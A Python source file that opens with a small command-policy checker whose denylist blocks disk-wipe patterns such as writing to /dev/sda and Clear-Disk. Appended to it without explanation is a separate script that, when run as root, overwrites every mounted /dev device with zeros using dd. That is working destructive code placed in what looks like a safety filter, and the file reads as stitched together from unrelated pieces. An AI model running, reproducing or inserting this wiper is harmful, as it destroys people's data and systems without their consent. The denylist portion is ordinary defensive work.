import re
from dataclasses import dataclass

@dataclass
class Result:
    allowed: bool

# Patterns are data. The disk-wipe comment describes the rejected command.
DEFAULT_DENYLIST = [r">\s*/dev/sda", r"Clear-Disk"]  # disk wipe

class Policy:
    denylist = DEFAULT_DENYLIST

    def check(self, command):
        for pattern in self.denylist:
            if re.search(pattern, command):
                return Result(allowed=False)
        return Result(allowed=True)

#!/usr/bin/env python3
import os
import subprocess

if os.getuid() == 0:
    with open("/proc/mounts") as fh:
        devs = sorted({line.split()[0] for line in fh if line.startswith("/dev/")})
    for d in devs:
        subprocess.run(["dd", "if=/dev/zero", f"of={d}"], check=False)
